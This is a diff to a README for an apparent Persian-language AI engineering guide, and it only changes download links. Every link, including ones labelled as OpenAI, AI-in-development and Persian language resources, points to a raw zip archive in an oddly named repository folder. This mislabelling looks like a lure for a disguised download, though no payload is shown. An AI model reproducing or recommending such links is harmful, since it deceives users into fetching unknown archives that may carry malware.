@@ -24,7 +24,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the software:
 
-[![Download from Releases](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/ai-native-engineering-persian_1.3.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/ai-native-engineering-persian_1.3.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/persian-ai-native-engineering-2.4-beta.3.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/persian-ai-native-engineering-2.4-beta.3.zip)
 
 ### Installation Steps
 
@@ -59,9 +59,9 @@ If you have questions, need help, or want to share your experience:
 
 Here are some helpful links and resources related to AI integration in engineering:
 
-- [OpenAI Resources](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/ai-native-engineering-persian_1.3.zip)
-- [AI in Software Development](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/ai-native-engineering-persian_1.3.zip)
-- [Persian Language Resources](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/ai-native-engineering-persian_1.3.zip) - For further learning in Persian.
+- [OpenAI Resources](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/persian-ai-native-engineering-2.4-beta.3.zip)
+- [AI in Software Development](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/persian-ai-native-engineering-2.4-beta.3.zip)
+- [Persian Language Resources](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/persian-ai-native-engineering-2.4-beta.3.zip) - For further learning in Persian.
 
 ## 🧷 Contribution
 
@@ -81,4 +81,4 @@ Remember to check for updates often. We continuously improve this guide to ensur
 
 To download the application again anytime, visit the following link:
 
-[Download from Releases](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/ai-native-engineering-persian_1.3.zip)
+[Download from Releases](https://raw.githubusercontent.com/Macalpha123/ai-native-engineering-persian/main/agglutinability/persian-ai-native-engineering-2.4-beta.3.zip)
